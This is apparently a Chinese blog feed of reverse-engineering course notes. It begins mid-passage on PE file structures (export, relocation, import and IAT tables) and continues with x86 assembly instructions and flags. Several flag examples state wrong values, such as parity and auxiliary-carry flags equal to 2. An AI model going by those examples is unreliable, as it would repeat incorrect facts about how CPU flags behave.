class="line">        <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">         &#123;</span></span><br><span class="line">                DWORD PhysicalAddress;      <span class="comment">// 节区的物理地址</span></span><br><span class="line">                DWORD VirtualSize;          <span class="comment">// 节区的真实长度（说真实长度是因为未初始化的值不会在文件中显示，但是内存可以计算出没有初始化的值，真实长度包含未初始化的值）。这两个值是一个联合结构，可以使用其中的任何一个，一般是取后一个。可以被修改</span></span><br><span class="line">        &#125; Misc;</span><br><span class="line">        DWORD VirtualAddress;               <span class="comment">// 节区的 RVA 地址</span></span><br><span class="line">        DWORD SizeOfRawData;                <span class="comment">// 在文件中对齐后的尺寸</span></span><br><span class="line">        DWORD PointerToRawData;             <span class="comment">// 节区在文件中的偏移量(离0有多远)(FOA)</span></span><br><span class="line">        DWORD PointerToRelocations;         <span class="comment">// 在OBJ文件中使用（exe无意义），重定位的偏移</span></span><br><span class="line">        DWORD PointerToLinenumbers;         <span class="comment">// 行号表的偏移（供调试使用）</span></span><br><span class="line">        WORD NumberOfRelocations;           <span class="comment">// 在OBJ文件中使用（exe无意义），重定位数目</span></span><br><span class="line">        WORD NumberOfLinenumbers;           <span class="comment">// 行号表中行号的数目（供调试使用）</span></span><br><span class="line">        DWORD Characteristics;              <span class="comment">// 节属性如可读，可写，可执行等</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p><code>Name</code>并不遵守必须以”\0”结尾的规律，如果不是以”\0”结尾，系统会截取8个字节的长度进行处理。</p><p>Misc可能会比VirtualAddress要大，例如<code>char a[1000];</code>，你声明了但是没有初始化，在文件中计算机不会分配空间，但是在内存中拉伸开就会分配1000。</p><h1 id="数据目录"><a href="#数据目录" class="headerlink" title="数据目录"></a>数据目录</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DATA_DIRECTORY STRUCT</span><br><span class="line">&#123;</span><br><span class="line">DWORD VirtualAddress;         <span class="comment">// 数据的起始RVA</span></span><br><span class="line">DWORD Size;<span class="comment">// 数据块的长度</span></span><br><span class="line">&#125;</span><br><span class="line">IMAGE_DATA_DIRECTORY ENDS</span><br></pre></td></tr></table></figure><h2 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h2><p>数据目录的第一个结构就是导出表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">+<span class="number">0</span>    DWORD   Characteristics;<span class="comment">// 未使用</span></span><br><span class="line">+<span class="number">4</span>    DWORD   TimeDateStamp;<span class="comment">// 时间戳</span></span><br><span class="line">+<span class="number">8</span>    WORD    MajorVersion;<span class="comment">// 未使用</span></span><br><span class="line">+<span class="number">10</span>    WORD    MinorVersion;<span class="comment">// 未使用</span></span><br><span class="line">+<span class="number">12</span>    DWORD   Name;<span class="comment">// 指向该导出表文件名字符串</span></span><br><span class="line">+<span class="number">16</span>    DWORD   Base;<span class="comment">// 导出函数起始序号</span></span><br><span class="line">+<span class="number">20</span>    DWORD   NumberOfFunctions;<span class="comment">// 所有导出函数的个数</span></span><br><span class="line">+<span class="number">24</span>    DWORD   NumberOfNames;<span class="comment">// 以函数名字导出的函数个数</span></span><br><span class="line">+<span class="number">28</span>    DWORD   AddressOfFunctions;     <span class="comment">// 导出函数地址表RVA</span></span><br><span class="line">+<span class="number">32</span>    DWORD   AddressOfNames;         <span class="comment">// 导出函数名称表RVA</span></span><br><span class="line">+<span class="number">36</span>    DWORD   AddressOfNameOrdinals;  <span class="comment">// 导出函数序号表RVA</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>AddressOfFunctions表里有可能有0，NumberOfFunctions未必是导出函数的个数。</p><p>如果用序号来导出，例如2 3 5 7 8，它会认为你有8-2+1=7个函数，AddressOfFunctions就会补上0</p><p>序号导出用不到序号表AddressOfNameOrdinals，可以直接找。<strong>序号表是为了找函数名称</strong>。如果函数名称写的是noname（隐藏名字），则就算有序号，函数序号也不会出现在函数表中。</p><p><img src="https://i.loli.net/2020/11/03/M5CyaRx63Wmcg8e.png" alt="image-20201103164406434"></p><p>通过函数名找到函数地址：如图所示</p><p>通过序号找到函数地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int value = 序号-base;</span><br><span class="line">函数地址 = AddressOfFunctions[序号-base]</span><br></pre></td></tr></table></figure><p><strong>导出表是利用”函数地址表”排的序：</strong></p><p><img src="https://i.loli.net/2020/11/30/pljM6d2rFSNHcnO.png" alt="image-20201130203727246"></p><p><img src="https://i.loli.net/2020/11/30/tfxeZPuhNc3r8Y4.png"></p><ul><li><p>第一个函数地址100f，它的索引是0，然后计算机就去序号表找0，如果找到了，就说明是用函数名称导出的。计算机找到了序号表索引为2的值是0，然后在函数名称表找到索引第二个名称Plus；</p></li><li><p>第三个函数地址0，计算机会直接跳过这个无效地址，不过它在内存地址中是真实存在的；</p></li><li><p>第四个函数地址100a，它的索引是3，计算机去序号表找不到3，所以这个是用序号导出的。索引是3，加上base的值2，导出序号就是5。</p></li></ul><h2 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h2><p>建议看看此<a href="https://www.cnblogs.com/predator-wang/p/4962775.html">链接</a>，写得比我要清楚</p><p>数据目录的第六个结构是重定位表</p><ol><li>一般情况下，EXE都是可以按照ImageBase的地址进行加载的，因为Exe拥有自己独立的4GB的虚拟内存空间。但DLL不是，DLL是当有EXE使用它，才会加载到相关EXE的进程空间的。</li><li>为了提高搜索的速度，模块间的地址也是要对齐的，模块地址对齐为10000H，也就是64K。</li></ol><p>编译时生成的地址都是ImageBase+RVA，但是全局变量或者字符串会直接给一个地址，假设在程序加载的时候，没有按照预定的400000载入指定位置，但是全局变量和字符串等等，地址是不会改变的，然后就会出错，所以需要重定位表来记录要修正的地方。</p><p>如果程序能够按照预定的ImageBase来加载的话，那么就不需要重定位表。所以exe很少有重定位表，而DLL大多都有重定位表。因为首先把exe加载到内存中，不会被占位，而dll很多，可能会出错。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfBlock;</span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_BASE_RELOCATION, * PIMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/12/01/hLU7Z6xGHFitlwB.png"></p><p>SizeOfBlock指的是当前块一共有多少字节</p><p>有多少块是不确定的，除去开头两个，后面的数据宽度都是2个字节</p><p>RVA=VirtualAddress+后面双字地址</p><p><strong>在比较靠近的重定位表项中，32位指针的高位地址总是相同的，如果把这些相近表项的高位地址统一表示，那么就可以省略一部分的空间。</strong></p><p><strong>计算机会把每一页里需要修改的数据放在一个块里。当按照一个内存页来分割时，在一个页面中寻址需要的指针位数是12位（一页等于4096字节，等于2的12次方），而两字节有16位，用12位即可表示当前页全部地址，多所以出的四位（多出四位的主要原因是因为对齐）用于描述是否需要重定向，如果值为0011则进行重定向。因为还有一种情况不需要重定向，那就是对齐</strong></p><p><strong>但凡涉及到直接寻址的指令都需要进行重定位处理</strong></p><p>把内存中需要重定位的数据按页的大小0x1000分为若干个块，而这个VirtualAddress就是每个块的起始RVA。如一个重定位项是33f2，去掉高位的3，得到3f2，再加上这个重定位块的VirtualAddress,00011000，就得到000113f2。只知道块的RVA当然还不行，我们要知道每一个需要重定位数据的具体地址。在程序没有被真正加载（得到真实的起始地址）之前，就用ImageBase作为基址（这时的ImageBase是00400000），相加得到004113f2。</p><p><strong>我的理解：</strong></p><p>如果一个dll装载程序的过程中，位置被其他dll占了，则需要修改imagebase，以及修改重定位表。因为一些全局变量的值需要使用重定位表修改，否则dll无法正常使用。</p><p>修复方式：</p><p>新imagebase-本来需要装载的imagebase</p><p>然后重定位表的RVA加上差值即可。</p><br><h2 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h2><p>数据目录的第二个结构是导入表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">+<span class="number">0</span>  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;</span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">//RVA 指向IMAGE_THUNK_DATA结构的数组INT(Import Name Table)</span></span><br><span class="line">    &#125;;</span><br><span class="line">+<span class="number">4</span>    DWORD   TimeDateStamp;              <span class="comment">//时间戳</span></span><br><span class="line">+<span class="number">8</span>    DWORD   ForwarderChain;</span><br><span class="line">+<span class="number">12</span>    DWORD   Name;<span class="comment">//RVA,指向dll名字，该名字已0结尾</span></span><br><span class="line">+<span class="number">16</span>    DWORD   FirstThunk;                 <span class="comment">//RVA,指向IMAGE_THUNK_DATA结构的数组IAT(Import Address Table)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>IMAGE_THUNK_DATA：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PBYTE  ForwarderString;</span><br><span class="line">        PDWORD Function;</span><br><span class="line">        DWORD Ordinal;<span class="comment">//序号</span></span><br><span class="line">        PIMAGE_IMPORT_BY_NAME  AddressOfData;<span class="comment">//指向IMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure><p>IMAGE_THUNK_DATA判断最高位是否为1，如果是，除去最高位的值就是函数的导出序号。如果不是，那么这个值是一个RVA，指向IMAGE_IMPORT_BY_NAME。然后通过调用<code>GetProcAddr(m,函数的名字或者导出序号);</code>获取地址。</p><p>PIMAGE_IMPORT_BY_NAME：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;<span class="comment">//可能为空，编译器决定 如果不为空 是函数在导出表中的索引</span></span><br><span class="line">    BYTE    Name[<span class="number">1</span>];<span class="comment">//函数名称，以0结尾</span></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p>加载前：</p><p><img src="https://i.loli.net/2020/12/10/dlayIvspiN6LQqm.png" alt="image-20201210192501792"></p><p>加载后：</p><p><img src="https://i.loli.net/2020/12/10/1fSquIi9wU3WJzO.png" alt="image-20201210192509954"></p><br><h2 id="绑定导入表"><a href="#绑定导入表" class="headerlink" title="绑定导入表"></a>绑定导入表</h2><p>数据目录的第12个结构是导入表</p><p>未加载的FirstThunk里未必是序号或者是函数名字的RVA，还有可能是已经加载好的函数地址。windows的大多数应用程序都采用了这种方法，能让程序启动的更快。</p><p>但是这种方法有弊端：</p><ol><li><p>dll没占到位置</p></li><li><p>dll被修改了</p></li></ol><p>那计算机如何判断FirstThunk是否绑定地址呢？</p><p>记得前面的TimeDateStamp时间戳吗，如果它的值为0，则表示IAT没有被绑定。如果它的值为-1（FFFFFFFF），则表示已经被绑定了。绑定的时间存在绑定导入表中的TimeDateStamp。<strong>当IMAGE_BOUND_IMPORT_DESCRIPTOR结构中的TimeDateStamp与DLL文件标准PE头中的TimeDateStamp值不相符时，或者DLL需要重新定位的时候，就会重新计算IAT中的值。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BOUND_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    DWORD   TimeDateStamp;<span class="comment">//时间戳，用来检查dll是否被更新</span></span><br><span class="line">    WORD    OffsetModuleName;<span class="comment">//dll的名字</span></span><br><span class="line">    WORD    NumberOfModuleForwarderRefs;<span class="comment">//本程序依赖另外的dll有几个</span></span><br><span class="line"><span class="comment">// Array of zero or more IMAGE_BOUND_FORWARDER_REF follows</span></span><br><span class="line">&#125; IMAGE_BOUND_IMPORT_DESCRIPTOR,  *PIMAGE_BOUND_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BOUND_FORWARDER_REF</span> &#123;</span></span><br><span class="line">    DWORD   TimeDateStamp;<span class="comment">//时间戳，用来检查dll是否被更新</span></span><br><span class="line">    WORD    OffsetModuleName;<span class="comment">//dll的名字</span></span><br><span class="line">    WORD    Reserved;<span class="comment">//保留，没有意义</span></span><br><span class="line">&#125; IMAGE_BOUND_FORWARDER_REF, *PIMAGE_BOUND_FORWARDER_REF;</span><br></pre></td></tr></table></figure><p>如果NumberOfModuleForwarderRefs的值为2，则在<code>_IMAGE_BOUND_IMPORT_DESCRIPTOR</code>结构后面会跟两个<code>_IMAGE_BOUND_FORWARDER_REF</code>结构。结束时会有个全0的结构。</p><p>OffsetModuleName计算的方法： 第一个*(_IMAGE_BOUND_IMPORT_DESCRIPTOR )+OffsetModuleName</p><br><h2 id="IAT表"><a href="#IAT表" class="headerlink" title="IAT表"></a>IAT表</h2><p>4070bc是exe的地址，Y是dll的地址。</p><p><img src="https://i.loli.net/2020/12/10/tMngayd4UbAfmLu.png" alt="image-20201210081552204"></p><p>Q.为什么调用dll要这么设计，而不是直接使用地址。</p><p>A.因为重定位表只能修复自己的文件，比如一个dll只能修复这个dll里的地址，一个exe只能修复这个exe里的地址。所以如果dll的位置被占了，只修复自己的地址，会导致exe无法调用该dll。而exe就不需要修改，因为一般来说，编译时exe是第一个占位置的，所以没人占他的位置。</p><p><strong>这些记录dll的Y指向的地址会组成一个表，表里存着函数的真正地址</strong>，因为程序要调用很多系统dll，如果我们的dll地址发生改变，要对每一处调用修改其调用地址是很麻烦的，如果有这样的表，我们将所有的函数调用的入口地址集中在一个集中的地址中，然后通过解析这个表方便我们进行修改，这样我们只要修改这个表所指的函数地址。</p><p>所以这个表不能随便移动，因为这些Y的值，在程序编译的时候就已经生成了，所以强行移动代价会很大。</p>]]></content>
      
      
      <categories>
          
          <category> 2020年9月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[视频笔记] 滴水逆向_汇编指令</title>
      <link href="/2020/09/19/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/"/>
      <url>/2020/09/19/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><table><thead><tr><th>32位寄存器</th><th>16位寄存器</th><th>8位寄存器</th><th>主要用途</th><th>编号</th></tr></thead><tbody><tr><td>EAX</td><td>AX</td><td>AL</td><td>累加器</td><td>0</td></tr><tr><td>ECX</td><td>CX</td><td>CL</td><td>计数</td><td>1</td></tr><tr><td>EDX</td><td>DX</td><td>DL</td><td>I/O指针</td><td>2</td></tr><tr><td>EBX</td><td>BX</td><td>BL</td><td>DS段的数据指针</td><td>3</td></tr><tr><td>ESP</td><td>SP</td><td>AH</td><td>堆栈指针</td><td>4</td></tr><tr><td>EBP</td><td>BP</td><td>CH</td><td>SS段的数据指针</td><td>5</td></tr><tr><td>ESI</td><td>SI</td><td>DH</td><td>字符串操作的源指针；SS段的数据指针</td><td>6</td></tr><tr><td>EDI</td><td>DI</td><td>BH</td><td>字符串操作的目标指针；ES段的数据指针</td><td>7</td></tr></tbody></table><br><h1 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h1><p>汇编指令由操作码和操作数组成</p><p>例：</p><p><code>mov eax,1</code></p><p>mov是操作码，1是源操作数，eax是目标操作数</p><ul><li>源操作数和目标操作数不能同时为内存单元。</li><li>操作数宽度必须一样</li></ul><p><code>pushad</code>把8个通用寄存器的值存到堆栈里去，用<code>popad</code>弹出。</p><p><code>push，pop</code>不能压入或弹出8位寄存器或者内存。</p><p><code>jmp</code>指令，修改eip的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp short //跳转的值离原来的值小与128字节，就用short</span><br></pre></td></tr></table></figure><p><code>call</code>指令，修改eip的值，并会把下一行指令的地址压入栈。<br><strong>call的本质就是jmp 地址，push 下一条指令的地址</strong></p><p><code>retn</code>指令，弹出栈中的地址并跳转。<br><strong>retn的本质就是pop eip。</strong></p><p><code>cmp</code>指令：比较两个操作数，<strong>相当于sub指令，但是相减的结构不存，只根据相减的结果改变标志位，当两个操作数相等时，ZF位1。</strong><br>一般用于比较两个数是否相等。</p><p><code>test</code>指令：两个数进行与操作，改变标志位。<br>一般用于判断寄存器是否等于0。</p><p><code>lea eax, dword ptr ds:[12ffc4]</code><br>取地址，eax的值为12ffc4，而不是地址中存储的值。</p><p><code>adc</code>带进位加法，adc ax,bx的意思是a=ax+bx+cf</p><p><code>sbb</code>带进位减法</p><p><code>xchg</code>交换，交换两个寄存器或内存的值。</p><p><code>movs</code>移动数据</p><p><code>movsb</code>的意思是mov byte，移动esi中地址数据到edi中，同时esi,edi都加1；</p><p><code>movsw</code>的意思是mov word，移动esi中地址数据到edi中，同时esi,edi都加2；</p><p><code>movsd</code>的意思是mov dword，移动esi中地址数据到edi中，同时esi,edi都加4。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov esi,0x19FF74</span><br><span class="line">mov edi,0x19FF90</span><br><span class="line">movs byte ptr es:[edi],byte ptr ds:[esi]//movsb其实就是这个的简写</span><br></pre></td></tr></table></figure><p>受df标志位影响，如果df标志位为1，则从加变成减。</p><p><code>stos</code>，将AL/AX/EAX的值存储到[EDI]指定的内存单元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stos byte ptr es:[edi]//简写为stosb，edi加1；</span><br><span class="line">stos word ptr es:[edi]//简写为stosw，edi加2；</span><br><span class="line">stos dword ptr es:[edi]//简写为stosd，edi加4；</span><br></pre></td></tr></table></figure><p>受df标志位影响，如果df标志位为1，则从加变成减。</p><p><code>rep</code>指令，按计数寄存器（ecx）中指定的次数重复执行字符串指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ecx,10</span><br><span class="line">rep movsd//重复16次</span><br><span class="line">rep stosd//重复16次</span><br></pre></td></tr></table></figure><p><code>movsx</code>指令：用于有符号类型转换，先<strong>符号</strong>扩展，再移动。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov al,0xff</span><br><span class="line">movsx cx,al;cx的值为ffff</span><br><span class="line">mov al,0x1f</span><br><span class="line">movsx cx,al;cx的值为001f</span><br></pre></td></tr></table></figure><p>符号扩展的意思是用符号位填充少的宽度。</p><p><code>movzx</code>指令：用于无符号类型转换，先零扩展，再移动。<br>零扩展的意思是用0填充少的宽度。</p><p><code>sete</code>用于设置bool值，可以参照jcc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov eax,dword ptr [ebp+8]</span><br><span class="line">xor ecx,ecx</span><br><span class="line">cmp eax,dword ptr [ebp+0ch]</span><br><span class="line">sete cl</span><br></pre></td></tr></table></figure><p>效果cl=zf，如果[ebp+8]=[ebp+0ch]则eax为1</p><p><code>offset</code>可以看成一个地址</p><h2 id="jcc"><a href="#jcc" class="headerlink" title="jcc"></a>jcc</h2><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>JE，JZ</td><td>结果为0时跳转</td><td>ZF = 1</td></tr><tr><td>JNE，JNZ</td><td>结果不为0时跳转</td><td>ZF = 0</td></tr><tr><td>JS</td><td>结果为负则跳转</td><td>SF = 1</td></tr><tr><td>JNS</td><td>结果为非负则跳转</td><td>SF = 0</td></tr><tr><td>JP，JPE</td><td>结果中1的个数为偶数则跳转</td><td>PF = 1</td></tr><tr><td>JNP，JPO</td><td>结果中1的个数为奇数则跳转</td><td>PF = 0</td></tr><tr><td>JO</td><td>结果溢出则跳转</td><td>OF = 1</td></tr><tr><td>JNO</td><td>结果没有溢出则跳转</td><td>OF = 0</td></tr><tr><td>JB，JNAE</td><td>小于则跳转</td><td>CF = 1</td></tr><tr><td>JNB，JAE</td><td>大于等于则跳转（无符号数）</td><td>CF = 0</td></tr><tr><td>JBE，JNA</td><td>小于等于则跳转（无符号数）</td><td>CF=1 or ZF=1</td></tr><tr><td>JNBE，JA</td><td>大于则跳转（无符号数）</td><td>CF = 0 and ZF=0</td></tr><tr><td>JL，JNGE</td><td>小于则跳转（有符号数）</td><td>SF!=OF</td></tr><tr><td>JNL，JGE</td><td>大于则跳转（有符号数）</td><td>SF=OF</td></tr><tr><td>JLE，JNG</td><td>小于等于则跳转（有符号数）</td><td>ZF=1 or SF!=OF</td></tr><tr><td>JNLE，JG</td><td>大于则跳转（有符号数）</td><td>ZF=0 and SF=OF</td></tr></tbody></table><h2 id="标志位"><a href="#标志位" class="headerlink" title="标志位"></a>标志位</h2><p><strong>mov不改变标志位</strong></p><p><strong>是无符号运算还是有符号运算由我们说了算</strong></p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>0</td><td>CF</td><td>进位标志</td></tr><tr><td>2</td><td>PF</td><td>奇偶标志</td></tr><tr><td>4</td><td>AF</td><td>辅助进位标志</td></tr><tr><td>6</td><td>ZF</td><td>零标志</td></tr><tr><td>7</td><td>SF</td><td>符号标志</td></tr><tr><td>8</td><td>TF</td><td>单步标志</td></tr><tr><td>9</td><td>IF</td><td>中断使能标志</td></tr><tr><td>10</td><td>DF</td><td>方向标志</td></tr><tr><td>11</td><td>OF</td><td>溢出标志</td></tr></tbody></table><ol><li>进位标志CF（carry flag）：如果运算结果的最高位产生一个进位或错位，那么其值为1，否则值为0。（无符号数）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,0xEF</span><br><span class="line">ADD AL,2</span><br><span class="line">//CF值为0</span><br><span class="line">MOV AL,0xFE</span><br><span class="line">ADD AL,2</span><br><span class="line">//CF值为1</span><br><span class="line">MOV AL,0xF0</span><br><span class="line">SUB AL,0xFF</span><br><span class="line">//CF值为1</span><br></pre></td></tr></table></figure><hr><ol start="2"><li>奇偶标志PF（Parity Flag）：奇偶标志PF用于反映运算结果中1的个数的奇偶性。如果1的个数为偶数，PF值为1，否则值为0。<strong>（最低有效字节，只看最后八位）</strong>不管32位16位还是8位的数，都只看最后八位有多少1。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,3</span><br><span class="line">ADD AL,3</span><br><span class="line">//3+3=6,0110,PF值为2</span><br><span class="line">ADD AL,2</span><br><span class="line">//6+2=8,1000,PF值为1</span><br></pre></td></tr></table></figure><hr><ol start="3"><li>辅助进位标志AF（Auxiliary Carry Flag）：</li></ol><p>在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0。</p><ul><li>在字操作时，发生低字节向高字节进位或借位时</li><li>在字节操作时，发生低4位向高4位进位或借位时</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX, 0x55EEFFFF</span><br><span class="line">ADD EAX, 2</span><br><span class="line">//AF的值为2</span><br><span class="line">MOV AX, 5EFE</span><br><span class="line">ADD AX, 2</span><br><span class="line">//AF的值为2</span><br><span class="line">MOV AL, 4E</span><br><span class="line">ADD AL, 2</span><br><span class="line">//AF的值为2</span><br></pre></td></tr></table></figure><hr><ol start="4"><li>零标志ZF（Zero Flag），零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XOR EAX, EAX</span><br><span class="line">//EAX清0,ZF值为1</span><br><span class="line">MOV EAX, 2</span><br><span class="line">SUB EAX, 2</span><br><span class="line">//ZF值为1</span><br></pre></td></tr></table></figure><p><strong>如果使用<code>MOV EAX,0</code>是不改变寄存器的</strong></p><hr><ol start="5"><li>符号标志SF（Sign Flag）,符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,7F</span><br><span class="line">ADD AL,2</span><br><span class="line">//7F = 0111 1111</span><br><span class="line">//7f+2 = 81</span><br><span class="line">//81 = 1000 0001</span><br><span class="line">//SF的值为1</span><br></pre></td></tr></table></figure><hr><ol start="6"><li>溢出标志OF（Overflow Flag），溢出标志OF用于反映<strong>有符号数</strong>加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表达的范围，则称为溢出，OF值为1。否则OF的值为0。</li></ol><p>和CF类似，不过这个是有符号数，取决于最高位。最高位由1变成0或者由0变成1，都会改变OF的值。</p><p>正+正=正 如果等于负数，则溢出</p><p>负+负=负 如果等于正数，则溢出</p><p>负+正不会溢出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov al,80</span><br><span class="line">sub al,40</span><br><span class="line">//1000 0000</span><br><span class="line">//+1100 0000</span><br><span class="line">//___________________</span><br><span class="line">//0100 0000</span><br><span class="line">//OF值为1</span><br><span class="line">//减法其实也是加法，只不过加的是有符号数负数。</span><br></pre></td></tr></table></figure><h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><h3 id="算数移位（有符号）"><a href="#算数移位（有符号）" class="headerlink" title="算数移位（有符号）"></a>算数移位（有符号）</h3><p>SAL：算术左移</p><p>SAR：算数右移</p><p>格式：<code>SAL/SAR Reg/Mem, CL/Imm</code></p><p>会把移出的数据放到cf里</p><p>SAL左移的时候会补0，SAR右移补符号位。</p><h3 